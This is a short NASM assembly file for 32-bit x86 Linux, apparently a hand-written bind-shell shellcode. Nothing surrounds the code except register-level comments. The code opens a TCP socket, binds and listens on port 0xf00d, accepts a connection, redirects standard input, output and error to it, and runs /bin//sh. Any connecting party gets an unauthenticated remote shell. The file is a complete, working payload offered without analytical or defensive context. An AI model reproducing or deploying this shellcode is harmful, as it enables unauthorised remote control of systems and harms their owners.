global main
global _start

section .text

_start:
xor ebx, ebx	;clear ebx
mul ebx		;clear eax
mov al, 0x66 	;syscall socketcall
push ebx	;tcp is 6 but 0 is fine
inc bl 		;ebx = 1; socket
push ebx	;sock_stream
push byte 0x2	;af_inet
mov ecx, esp	;move pointer to args to ecx
int 0x80	;socket()
mov edi,eax 	;int socketfd


push byte 0x66	;better than xor eax, eax
pop eax		;mov al, 0x66
pop ebx		;take the 2 off the stack for bind()
pop esi		;discard the 0x1 on the stack into esi so the top of the stack is now the 0x0
push word 0xf00d;portno
push word bx 	;2 = af_inet
mov ecx, esp	;pointer to args
push byte 0x10	;addrlen
push ecx	;const struct sockaddr *addr
push edi	;sockfd from socket
mov ecx, esp 	;pointer to args
int 0x80	;go

push byte 0x66
pop eax
add ebx, ebx	;2+2=4 listen
push byte 0x1	;backlog
push edi	;int sockfd
mov ecx, esp 	;pointer to args
int 0x80	;listen()

push byte 0x66
pop eax
inc ebx		;5 accept
xor edx, edx
push edx 	;0
push edx 	;null
push edi 	;sockfd
mov ecx, esp 	;pointer to args
int 0x80

xchg eax, ebx	;set ebx to sockfd, eax to 00000005
xor ecx, ecx
mov cl, 0x2	;loop counter
dup2:
	mov al, 0x3f ;dup2
	int 0x80
	dec ecx
	jns dup2

xor eax, eax
push eax
push 0x68732f2f ;"sh//"
push 0x6e69622f ;"nib/"
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 0xb	;execve
int 0x80
